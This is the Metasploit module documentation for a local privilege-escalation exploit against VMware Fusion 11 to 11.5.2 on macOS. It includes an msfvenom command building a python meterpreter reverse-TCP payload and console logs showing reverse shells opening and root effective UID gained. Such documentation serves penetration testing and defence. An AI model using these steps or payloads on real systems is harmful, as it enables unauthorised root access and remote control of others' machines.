## Vulnerable Application

This exploits an improper use of setuid binaries within VMWare Fusion 11 - 11.5.2. The `Open VMware USB Arbitrator Service` can be
launched outide of its standard path which allows loading of an attacker controlled binary. By creating a payload in the user home
directory in a specific folder, and creating a hard link to the `Open VMWare USB Arbitrator Service`, we're able to launch it
temporarily to start our payload with an effective UID of 0.

Additional description can be found in
@mirchr's [exploit](https://raw.githubusercontent.com/mirchr/security-research/master/vulnerabilities/CVE-2020-3950.sh).

VMWare Fusion 11.5.1 is available from [VMWare](https://download3.vmware.com/software/fusion/file/VMware-Fusion-11.5.1-15018442.dmg).

## Verification Steps

  1. Install the application
  2. Start msfconsole
  3. Get a shell
  4. Do: ```use exploit/osx/local/vmware_fusion_lpe```
  5. Do: ```set session #```
  6. Do: ```run```
  7. You should get a `euid=0` shell.

## Options

### Session

Which session to use this exploit on.

## Scenarios

### VMware Fusion 11.5.1 (15018442) on macOS 10.15.3 (19D76)

```
/msfvenom --payload python/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=8888 -b "\x00" -o /var/www/html/meterp_8888.py
```

```
[*] Processing fusion.rb for ERB directives.
resource (fusion.rb)> setg verbose true
verbose => true
resource (fusion.rb)> use exploit/multi/handler
resource (fusion.rb)> set payload python/meterpreter/reverse_tcp
payload => python/meterpreter/reverse_tcp
resource (fusion.rb)> setg lhost 1.1.1.1
lhost => 1.1.1.1
resource (fusion.rb)> set lport 8888
lport => 8888
resource (fusion.rb)> exploit
[+] Vmware Fusion 11.5.1 is exploitable
[*] The target appears to be vulnerable.
[*] Started reverse TCP handler on 1.1.1.1:8888 
[*] Sending stage (53755 bytes) to 2.2.2.2
[*] Meterpreter session 1 opened (1.1.1.1:8888 -> 2.2.2.2:49265) at 2020-03-23 18:07:57 -0400

meterpreter > getuid
Server username: h00die
meterpreter > sysinfo
Computer        : h00dies-MBP.doman
OS              : Darwin 19.3.0 Darwin Kernel Version 19.3.0: Thu Jan  9 20:58:23 PST 2020; root:xnu-6153.81.5~1/RELEASE_X86_64
Architecture    : x64
System Language : en_US
Meterpreter     : python/osx
meterpreter > background
[*] Backgrounding session 1...
```

```
resource (fusion.rb)> use exploit/osx/local/vmware_fusion_lpe
resource (fusion.rb)> set session 1
session => 1
resource (fusion.rb)> exploit

[!] SESSION may not be compatible with this module.
[*] Started reverse TCP handler on 1.1.1.1:4444 
[+] 'Open VMware USB Arbitrator Service' binary detected
[*] Uploading Payload
[*] Creating folder (/Users/h00die/2KLH/s0m/wX8XO/) and link
[*] Starting USB Arbitrator Service (5 sec pause)
[*] Meterpreter session 2 opened (1.1.1.1:4444 -> 2.2.2.2:49269) at 2020-03-23 18:08:14 -0400
[+] Deleted /Users/h00die/Contents/Library/services/VMware USB Arbitrator Service
[*] Killing service
[*] Deleting /Users/h00die/2KLH

meterpreter > getuid
Server username: h00die @ h00dies-MBP.domain (uid=501, gid=20, euid=0, egid=20)
meterpreter > sysinfo
Computer     : h00dies-MBP.domain
OS           : macOS Unknown (macOS 10.15.3)
Architecture : x86
BuildTuple   : x86_64-apple-darwin
Meterpreter  : x64/osx

```
